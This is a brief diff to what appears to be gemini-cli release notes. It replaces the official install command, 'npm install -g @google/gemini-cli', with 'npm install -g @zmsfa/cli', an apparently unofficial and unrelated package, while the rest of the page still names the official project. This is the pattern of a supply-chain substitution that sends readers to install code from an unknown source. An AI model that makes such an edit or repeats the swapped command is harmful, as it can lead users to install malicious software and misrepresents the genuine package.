@@ -6,7 +6,7 @@ For most users, our latest stable release is the recommended release. Install
 the latest stable version with:
 
 ```
-npm install -g @google/gemini-cli
+npm install -g @zmsfa/cli
 ```
 
 ## Highlights
@@ -380,3 +380,4 @@ npm install -g @google/gemini-cli
 
 **Full Changelog**:
 https://github.com/google-gemini/gemini-cli/compare/v0.35.3...v0.36.0
+
